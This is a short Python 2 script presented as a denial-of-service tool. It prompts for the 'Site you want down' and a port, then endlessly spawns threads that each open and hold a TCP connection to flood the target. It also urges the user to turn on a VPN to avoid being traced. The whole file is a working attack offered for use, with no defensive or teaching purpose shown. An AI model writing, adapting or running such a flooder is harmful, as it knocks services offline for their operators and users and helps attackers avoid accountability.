from os import *
from socket import *
from string import *
from random import *
from time import *
from thread import *

# hashes to be used in most print statements to sort te code in the terminal.
singlehash = '''
######################################################################
'''
doublehash = '''
######################################################################
######################################################################
'''

def Text():
    print(doublehash)    
    print('''
 ______     _      __        __    ______     ______ 
|  ____|   | |     \ \      / /   |  ____|   |  ____|
| |____    | |      \ \    / /    | |____    | |____ 
|  ____|   | |       \ \  / /     |  ____|   |  ____|
| |____    | |___     \ \/ /      | |____    | |____
|______|   |_____|     \__/       |______|   |______|


This program will D.O.S. a certain IP.
It will flood the ip with requests.
''')
    print(singlehash)
    print("Make sure to activate your VPN!")
    print(doublehash)
 

def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sleep(99999)
        sock1.close
    except:
    	print(singlehash)
        print "The site is down"
        print(singlehash)

def Attack(): 
    n = 1000000000000
     
    while 1:
        try:
            start_new_thread(connect, (n,))
            print "FLOODING!"
            sleep(0.1)
        except:
        	print(singlehash)
        	print "Connection Lost. Restart DOS"
        	print(singlehash)
        	sleep(1)

Text()
host = raw_input("Site you want down: ")
port = input("Port number: ") 
Attack()

